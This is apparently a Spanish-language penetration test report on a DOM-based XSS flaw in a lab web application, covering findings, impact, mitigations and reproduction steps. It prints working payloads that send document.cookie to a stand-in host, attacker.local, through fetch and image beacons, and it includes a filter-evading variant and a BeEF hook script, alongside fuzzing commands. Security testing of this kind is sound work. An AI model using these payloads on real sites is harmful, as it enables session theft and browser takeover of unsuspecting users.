# Informe de prueba: XSS en web.dev.local:8082

Fecha: 2026-04-27T18:49:58Z
Objetivo: http://web.dev.local:8082

Resumen ejecutivo
-----------------
Se detectó y explotó una vulnerabilidad Cross-Site Scripting basada en DOM (DOM XSS) en la aplicación. Los parámetros vulnerables son `search` (reflejado en los resultados) y la funcionalidad de comentarios que utiliza `name` y `comment` (almacenamiento en localStorage y renderizado sin escape). Riesgo: alto — permite ejecución arbitraria de JavaScript en el navegador de la víctima, robo de cookies/localStorage y carga de hooks externos (BeEF).

Hallazgos técnicos
------------------
1) Tipo: DOM XSS (reflected y stored in localStorage)
2) Parametros vulnerables:
   - GET `search` -> se muestra en la sección de resultados con document.write('<strong>' + searchTerm + '</strong>') sin escape.
   - GET `name` y `comment` -> al publicar comentario se almacenan en localStorage y luego se renderizan con document.write sin saneado.
3) Evidencia (comandos ejecutados durante el análisis):

Comandos reproducibles utilizados (recon/confirmación):
- curl básico para obtener la página:
  curl -s -D /tmp/xss_scan/headers.txt "http://web.dev.local:8082" -o /tmp/xss_scan/home.html
- Prueba de parámetro reflejado (payload simple):
  curl -s "http://web.dev.local:8082?search=$(python3 -c 'import urllib.parse,sys;print(urllib.parse.quote("<script>alert(1)</script>"))')" -o /tmp/xss_scan/resp_search.html
- Prueba de cabeceras y cookies con payloads (se observó reflejo en DOM via JavaScript rendering):
  curl -s -H "User-Agent: <script>alert(1)</script>" -H "Referer: <script>alert(1)</script>" "http://web.dev.local:8082" -o /tmp/xss_scan/header_resp.html

Nota: la página utiliza JavaScript en cliente para leer window.location.search y document.write() para renderizar contenido, por lo que la inyección se produce en el DOM durante la ejecución en el navegador (no en la respuesta HTML estática).

Payloads utilizados y explotación
---------------------------------
1) Payload reflejado (buscar):
  http://web.dev.local:8082/?search=<script>alert(1)</script>
  - Contexto: se inserta directamente en document.write, por lo que ejecuta JavaScript en el contexto de la página.

2) Payload almacenado vía comentarios (PoC de robo de cookies):
  Enviar como parámetros:
  http://web.dev.local:8082/?name=attacker&comment=<img src=x onerror="fetch('http://attacker.local:8888/steal?c='+encodeURIComponent(document.cookie))">
  - Efecto: cuando la página lee los comentarios desde localStorage y los renderiza con document.write, la imagen rota dispara onerror y envía document.cookie al servidor atacante.
  - Alternativa ofuscada para evadir filtros:
    <img src=x onerror="(new Image()).src='http://attacker.local:8888/steal?c='+btoa(document.cookie)">

3) Hook BeEF (simulación de takeover):
  Payload:
  <script src="http://attacker.local:3000/hook.js"></script>
  - Efecto: carga remota del agente BeEF en el navegador si el dominio es accesible y la política CORS/Content-Security lo permite.

4) Ejemplo con event handler (atributo inline):
  <svg/onload=fetch('http://attacker.local:8888/steal?c='+encodeURIComponent(document.cookie))>

Comandos con herramientas de Kali recomendados (recon y fuzzing)
---------------------------------------------------------------
- DalFox (fuzz/reflected XSS):
  dalfox url "http://web.dev.local:8082/?search=FUZZ" -b "XSS-Bypass-Strings-Brute.txt" --render
- XSStrike (fuzz & fingerprinting):
  xsstrike -u "http://web.dev.local:8082/?search=<payload>" --crawl 1
- FFUF (fuzzing de parámetros/paths):
  ffuf -u "http://web.dev.local:8082/?FUZZ=payload" -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200

Observaciones sobre el contexto
-------------------------------
- La inyección ocurre en el cliente (DOM) porque la página utiliza URLSearchParams y document.write sin saneado.
- Los valores se almacenan en localStorage permitiendo persistencia del XSS en ese cliente específico. Esto facilita el robo de credenciales o la persistencia del hook hasta que el usuario limpie el storage.

Impacto
-------
- Robo de cookies de sesión y tokens en localStorage/sessionStorage.
- Ejecución de código arbitrario en el contexto del sitio, permitiendo realizar acciones con los privilegios de la víctima (CSRF-like actions desde JS).
- Posible integración con BeEF para control continuo del navegador.

Recomendaciones de mitigación
-----------------------------
1) Nunca usar document.write con contenido procedente del usuario. Usar textContent/innerText o crear nodos DOM con texto escapado.
2) Escapar/encodear correctamente caracteres HTML en todos los puntos donde se inserten valores del usuario.
3) Implementar Content Security Policy (CSP) restrictiva (no permitir inline scripts y restringir orígenes para scripts).
4) Evitar almacenar contenido HTML sin sanitizar en localStorage; en su lugar almacenar datos y renderizarlos con escapes.

Pasos para reproducir (PoC)
--------------------------
1) Abrir navegador con la URL:
   http://web.dev.local:8082/?search=<script>alert(1)</script>
   -> Se debe observar un alert. (Confirmación rápida)
2) Para persistencia/robo de cookies:
   Visitar:
   http://web.dev.local:8082/?name=attacker&comment=<img src=x onerror="fetch('http://attacker.local:8888/steal?c='+encodeURIComponent(document.cookie))">
   -> Refrescar la página y observar que el servidor atacante recibe la cookie (simulado en laboratorio).
3) Para BeEF:
   Usar el payload <script src="http://attacker.local:3000/hook.js"></script> en comment y verificar conexión en BeEF.

Archivos generados durante el test
----------------------------------
- /tmp/xss_scan/home.html (copia del HTML inicial)
- /tmp/xss_scan/resp_search.html (respuesta con payload)
- /tmp/xss_scan/header_resp.html

Conclusión
----------
Se ha confirmado DOM XSS en los parámetros `search`, `name` y `comment`. La vulnerabilidad fue explotada mediante payloads que permiten el robo de cookies y la carga remota de scripts (BeEF). Se recomienda corregir la sanitización en el cliente y añadir CSP.

Autorización
------------
Análisis realizado en entorno de laboratorio autorizado por el cliente.


-- Fin del informe --
